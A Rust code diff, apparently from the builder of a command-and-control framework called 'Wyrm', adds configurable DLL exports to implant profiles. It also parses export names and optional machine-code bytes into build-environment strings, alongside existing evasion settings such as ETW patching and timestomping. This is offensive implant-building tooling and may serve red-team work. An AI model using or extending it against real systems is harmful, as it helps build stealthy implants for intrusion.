@@ -4,7 +4,7 @@ use std::{
 };
 
 use serde::Deserialize;
-use shared::tasks::{NewAgentStaging, StageType, WyrmResult};
+use shared::tasks::{Exports, NewAgentStaging, StageType, WyrmResult};
 use tokio::io;
 
 #[derive(Deserialize, Debug, Default, Clone)]
@@ -35,6 +35,7 @@ pub struct Implant {
     pub debug: Option<bool>,
     pub network: Network,
     pub evasion: Evasion,
+    pub exports: Exports,
 }
 
 #[derive(Deserialize, Debug, Default, Clone)]
@@ -144,6 +145,7 @@ impl Profile {
             patch_etw,
             jitter: implant.network.jitter,
             timestomp: implant.evasion.timestomp.clone(),
+            exports: implant.exports.clone(),
         })
     }
 }
@@ -249,4 +251,57 @@ async fn read_profile(path: &Path) -> io::Result<Profile> {
     };
 
     Ok(profile)
+}
+
+#[derive(Debug)]
+pub struct ParsedExportStrings {
+    pub export_only_jmp_wyrm: String,
+    pub export_machine_code: String,
+}
+
+impl ParsedExportStrings {
+    fn empty() -> Self {
+        Self {
+            export_only_jmp_wyrm: String::new(),
+            export_machine_code: String::new(),
+        }
+    }
+
+    fn from(plain_only: String, machine_code: String) -> Self {
+        Self {
+            export_only_jmp_wyrm: plain_only,
+            export_machine_code: machine_code,
+        }
+    }
+}
+
+/// Parses a Vec of [`shared::tasks::Export`] correctly formatted to be directly inserted into the
+/// cargo build process for an implant. If the input is `None`, it will return an empty string.
+pub fn parse_exports_to_string_for_env(exports: &Exports) -> ParsedExportStrings {
+    let exports = match exports {
+        Some(e) => e,
+        None => return ParsedExportStrings::empty(),
+    };
+
+    // For building with junk / user defined machine code
+    let mut builder_with_machine_code = String::new();
+    // For building just the Export -> call start_wyrm;
+    let mut builder_plain = String::new();
+
+    for e in exports {
+        if let Some(machine_code) = &e.1.machine_code {
+            // If we have machine code present
+            builder_with_machine_code.push_str(format!("{}=", e.0).as_str());
+            for m in machine_code {
+                builder_with_machine_code.push_str(format!("0x{:X},", m).as_str());
+            }
+            // remove the trailing ','
+            builder_with_machine_code.remove(builder_with_machine_code.len() - 1);
+            builder_with_machine_code.push_str(";");
+        } else {
+            builder_plain.push_str(format!("{};", e.0,).as_str());
+        }
+    }
+
+    ParsedExportStrings::from(builder_plain, builder_with_machine_code)
 }
